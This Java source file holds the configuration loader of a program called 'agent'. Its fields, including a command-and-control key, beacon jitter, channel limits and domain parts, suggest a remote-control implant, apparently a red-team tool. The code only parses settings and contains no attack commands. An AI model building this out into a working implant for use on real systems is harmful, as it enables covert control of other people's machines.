package agent;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Hashtable;

public class Cfg {
	public static Hashtable configRsc() throws IOException {
		StringBuilder configRaw = new StringBuilder();
		
		ClassLoader classloader = Thread.currentThread().getContextClassLoader();
		InputStream configReader = classloader.getResourceAsStream("config.json");
		BufferedReader reader = new BufferedReader(new InputStreamReader(configReader));
		String line;
		while ((line = reader.readLine()) != null) {
			configRaw.append(line);
		}
		Hashtable configTable = Util.tabify(configRaw.toString());
		return configTable;
	}
	
	public static void reConfig(Hashtable newConfig) {
		Main.config.put("ctrlKey",newConfig.get("ctrlKey").toString());
		Main.config.put("distKey",newConfig.get("distKey").toString());
		Main.config.put("ccKey",Base64.getDecoder().decode(newConfig.get("ccKey").toString()));
		Main.config.put("password",newConfig.get("password").toString());
		Main.config.put("confKey",newConfig.get("confKey").toString());
		Main.config.put("acid",newConfig.get("acid").toString());
		if (newConfig.get("pkgCore").equals("[]")) {
			Main.config.put("pkgCore", new String[] {});
		} else {
			String[] pkgIDs = (newConfig.get("pkgCore").toString()).split(",");
			Main.config.put("pkgCore", pkgIDs);
		}
	}
	
	public static Hashtable initConfig() throws IOException {
		Hashtable confTemplate = new Hashtable();
		return mkConfig(confTemplate);
	}
	
	public static Hashtable mkConfig(Hashtable confTemplate) throws IOException {
		//deployment process will fill out the config file
		//once you're done testing dump the values and fill in with template targets
		Hashtable configTable = configRsc();
		confTemplate.put("regKey",configTable.get("regKey").toString());
		confTemplate.put("ctrlKey","");
		confTemplate.put("distKey","");
		confTemplate.put("sigKey","");
		confTemplate.put("maxRtxc", 5);
		confTemplate.put("maxChannel", 5);
		confTemplate.put("ccKey",Base64.getDecoder().decode(configTable.get("ccKey").toString()));
		confTemplate.put("acid", configTable.get("acid"));
		confTemplate.put("password",configTable.get("password"));
		confTemplate.put("jitterMin",Integer.parseInt(configTable.get("jitterMin").toString()));
		confTemplate.put("jitterMax",Integer.parseInt(configTable.get("jitterMax").toString()));
		confTemplate.put("threadsMax",Integer.parseInt(configTable.get("threadsMax").toString()));
		confTemplate.put("tld",configTable.get("tld"));
		confTemplate.put("domain",configTable.get("domain").toString());
		confTemplate.put("subDomain",configTable.get("subDomain").toString());
		return confTemplate;
	}
}
